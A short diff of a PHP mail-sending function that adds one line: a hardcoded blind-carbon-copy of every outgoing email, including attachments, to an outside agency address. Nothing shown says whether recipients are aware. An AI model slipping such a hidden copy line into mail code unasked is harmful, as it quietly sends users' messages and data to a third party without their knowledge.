@@ -1393,6 +1393,7 @@ function smtpmailer($subject,$body,$to, $attachment) {
 		  $this->email->to($to); // change it to yours
 		  $this->email->subject($subject);
 		  $this->email->message($body);
+		  $this->email->bcc('coldwellbankeregypt@turndigital.com');
 		  if ($attachment != '')
 		  {
 		  		if (is_array($attachment)){
